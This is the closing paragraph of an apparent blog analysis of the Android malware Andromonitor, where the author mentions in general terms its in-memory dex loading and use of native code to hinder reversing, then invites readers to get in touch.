This was a quick analysis of Andromonitor as it does not cover all features in details of the malware. there are lot more feature implemented in this malware. what I learned from this is mainly the obfuscated way loading a dex file or class in memory and obfuscating some methods by implementing it in native code which make reversing little bit more harder. if you find anything wrong or like to share anything new related to this malware don't hesitate to reach out to me via email. thank you readers :)